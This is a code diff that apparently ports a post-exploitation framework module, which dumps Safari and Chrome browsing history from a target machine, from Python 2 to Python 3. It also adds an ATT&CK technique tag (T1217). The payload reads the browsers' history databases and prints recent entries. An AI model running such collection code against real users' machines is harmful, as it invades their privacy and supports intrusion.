@@ -14,6 +14,10 @@ class Module(object):
             # more verbose multi-line description of the module
             'Description': ("This module will dump browser history from Safari and Chrome."),
 
+            'Software': '',
+
+            'Techniques': ['T1217'],
+
             # True if the module needs to run in the background
             'Background': False,
 
@@ -83,13 +87,13 @@ number = ''
 class browser_dump():
     def __init__(self):
         try:
-            print "[*] Dump Started!"
+            print("[*] Dump Started!")
         except Exception as e:
-            print e
+            print(e)
 
     def func(self, number):
-        print "Dumping safari..."
-        print ""
+        print("Dumping safari...")
+        print("")
         try:
 
             from os.path import expanduser
@@ -102,14 +106,14 @@ class browser_dump():
                 statment = cur.fetchall()
                 number = %s * -1
                 for item in statment[number:]:
-                    print item
+                    print(item)
                     
                 conn.close()
         except Exception as e:
-            print e
-        print ""
-        print "Dumping Chrome..."
-        print ""
+            print(e)
+        print("")
+        print("Dumping Chrome...")
+        print("")
         try:
 
             from os.path import expanduser
@@ -121,16 +125,18 @@ class browser_dump():
                 statment = cur.fetchall()
                 number = %s * -1
                 for item in statment[number:]:
-                    print item
+                    print(item)
 
                 conn.close()
         except Exception as e:
-            print "error"
-            print e
+            print("error")
+            print(e)
 
 
 s = browser_dump()
 s.func(number)
 """ % (number, number)
 
+
         return script
+
